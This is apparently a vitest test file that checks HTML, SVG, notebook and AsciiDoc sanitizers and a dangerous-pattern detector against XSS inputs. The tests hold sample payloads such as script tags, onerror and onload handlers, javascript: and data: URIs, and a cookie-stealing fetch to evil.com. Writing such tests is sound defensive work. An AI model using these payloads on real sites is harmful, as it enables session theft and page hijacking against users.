import { describe, it, expect } from 'vitest';
import {
  sanitizeHTML,
  sanitizeSVG,
  sanitizeNotebookHTML,
  sanitizeAsciiDocHTML,
  createSafeIframeSrcDoc,
  detectDangerousPatterns,
} from '../src/utils/sanitize';

describe('XSS Prevention - HTML Sanitization', () => {
  describe('sanitizeHTML', () => {
    it('should remove script tags', () => {
      const malicious = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
      const sanitized = sanitizeHTML(malicious);
      
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('World');
    });

    it('should remove event handlers', () => {
      const malicious = '<img src="x" onerror="alert(\'XSS\')">';
      const sanitized = sanitizeHTML(malicious);
      
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove javascript: protocol', () => {
      const malicious = '<a href="javascript:alert(\'XSS\')">Click me</a>';
      const sanitized = sanitizeHTML(malicious);
      
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove onclick handlers', () => {
      const malicious = '<button onclick="alert(\'XSS\')">Click</button>';
      const sanitized = sanitizeHTML(malicious);
      
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('alert');
    });

    it('should allow safe HTML', () => {
      const safe = '<p><strong>Bold</strong> and <em>italic</em> text</p>';
      const sanitized = sanitizeHTML(safe);
      
      expect(sanitized).toContain('<strong>');
      expect(sanitized).toContain('<em>');
      expect(sanitized).toContain('Bold');
    });

    it('should allow safe links', () => {
      const safe = '<a href="https://example.com">Link</a>';
      const sanitized = sanitizeHTML(safe);
      
      expect(sanitized).toContain('href="https://example.com"');
      expect(sanitized).toContain('Link');
    });

    it('should remove iframe tags', () => {
      const malicious = '<iframe src="https://evil.com"></iframe>';
      const sanitized = sanitizeHTML(malicious);
      
      expect(sanitized).not.toContain('<iframe');
    });
  });

  describe('sanitizeSVG', () => {
    it('should remove script tags from SVG', () => {
      const malicious = '<svg><script>alert("XSS")</script><circle r="10"/></svg>';
      const sanitized = sanitizeSVG(malicious);
      
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove event handlers from SVG', () => {
      const malicious = '<svg onload="alert(\'XSS\')"><circle r="10"/></svg>';
      const sanitized = sanitizeSVG(malicious);
      
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert');
    });

    it('should allow safe SVG elements', () => {
      const safe = '<svg width="100" height="100"><circle cx="50" cy="50" r="40" fill="red"/></svg>';
      const sanitized = sanitizeSVG(safe);
      
      expect(sanitized).toContain('<circle');
      expect(sanitized).toContain('cx="50"');
      expect(sanitized).toContain('fill="red"');
    });
  });

  describe('sanitizeNotebookHTML', () => {
    it('should remove scripts from notebook HTML', () => {
      const malicious = '<div><script>alert("XSS")</script><p>Data</p></div>';
      const sanitized = sanitizeNotebookHTML(malicious);
      
      expect(sanitized).not.toContain('<script');
      expect(sanitized).toContain('Data');
    });

    it('should allow data visualization HTML', () => {
      const safe = '<div class="plot"><svg><rect x="0" y="0" width="100" height="100"/></svg></div>';
      const sanitized = sanitizeNotebookHTML(safe);
      
      expect(sanitized).toContain('<svg');
      expect(sanitized).toContain('<rect');
    });

    it('should remove form elements', () => {
      const malicious = '<form><input type="text" name="data"><button>Submit</button></form>';
      const sanitized = sanitizeNotebookHTML(malicious);
      
      expect(sanitized).not.toContain('<form');
      expect(sanitized).not.toContain('<input');
      expect(sanitized).not.toContain('<button');
    });
  });

  describe('sanitizeAsciiDocHTML', () => {
    it('should remove scripts from AsciiDoc HTML', () => {
      const malicious = '<div class="content"><script>alert("XSS")</script><p>Content</p></div>';
      const sanitized = sanitizeAsciiDocHTML(malicious);
      
      expect(sanitized).not.toContain('<script');
      expect(sanitized).toContain('Content');
    });

    it('should allow AsciiDoc formatting', () => {
      const safe = '<div class="sect1"><h2>Title</h2><div class="sectionbody"><p>Paragraph</p></div></div>';
      const sanitized = sanitizeAsciiDocHTML(safe);
      
      expect(sanitized).toContain('<h2>');
      expect(sanitized).toContain('Title');
      expect(sanitized).toContain('Paragraph');
    });
  });

  describe('createSafeIframeSrcDoc', () => {
    it('should sanitize HTML for iframe', () => {
      const malicious = '<html><body><script>alert("XSS")</script><p>Content</p></body></html>';
      const { srcDoc, sandbox } = createSafeIframeSrcDoc(malicious);
      
      expect(srcDoc).not.toContain('<script');
      expect(srcDoc).not.toContain('alert');
      expect(srcDoc).toContain('Content');
      expect(sandbox).toBe('allow-same-origin');
    });

    it('should return restrictive sandbox attribute', () => {
      const safe = '<p>Safe content</p>';
      const { sandbox } = createSafeIframeSrcDoc(safe);
      
      expect(sandbox).toBe('allow-same-origin');
      expect(sandbox).not.toContain('allow-scripts');
    });
  });

  describe('detectDangerousPatterns', () => {
    it('should detect script tags', () => {
      const content = '<p>Hello</p><script>alert("XSS")</script>';
      const result = detectDangerousPatterns(content);
      
      expect(result.hasDangerousPatterns).toBe(true);
      expect(result.patterns).toContain('script tags');
    });

    it('should detect event handlers', () => {
      const content = '<img src="x" onerror="alert(\'XSS\')">';
      const result = detectDangerousPatterns(content);
      
      expect(result.hasDangerousPatterns).toBe(true);
      expect(result.patterns).toContain('event handlers');
    });

    it('should detect javascript: protocol', () => {
      const content = '<a href="javascript:alert(\'XSS\')">Link</a>';
      const result = detectDangerousPatterns(content);
      
      expect(result.hasDangerousPatterns).toBe(true);
      expect(result.patterns).toContain('javascript: protocol');
    });

    it('should detect eval calls', () => {
      const content = 'eval("malicious code")';
      const result = detectDangerousPatterns(content);
      
      expect(result.hasDangerousPatterns).toBe(true);
      expect(result.patterns).toContain('eval/Function calls');
    });

    it('should not flag safe content', () => {
      const content = '<p><strong>Safe</strong> content with <a href="https://example.com">link</a></p>';
      const result = detectDangerousPatterns(content);
      
      expect(result.hasDangerousPatterns).toBe(false);
      expect(result.patterns).toHaveLength(0);
    });
  });

  describe('Real-world XSS attack vectors', () => {
    it('should block image with onerror', () => {
      const attack = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
      const sanitized = sanitizeHTML(attack);
      
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('fetch');
      expect(sanitized).not.toContain('evil.com');
    });

    it('should block SVG with onload', () => {
      const attack = '<svg onload="window.location=\'https://evil.com\'">';
      const sanitized = sanitizeSVG(attack);
      
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('window.location');
    });

    it('should block data URI with javascript', () => {
      const attack = '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>';
      const sanitized = sanitizeHTML(attack);
      
      expect(sanitized).not.toContain('data:text/html');
      expect(sanitized).not.toContain('<script');
    });

    it('should preserve safe content even with dangerous styles', () => {
      const attack = '<div style="background:url(javascript:alert(\'XSS\'))">Text</div>';
      const sanitized = sanitizeHTML(attack);
      
      // DOMPurify may keep the style attribute, but browsers won't execute javascript: in CSS
      // The important thing is the content is preserved and inline scripts are removed
      expect(sanitized).toContain('Text');
      // Even if style is kept, no standalone script tags should exist
      expect(sanitized).not.toContain('<script');
    });
  });
});
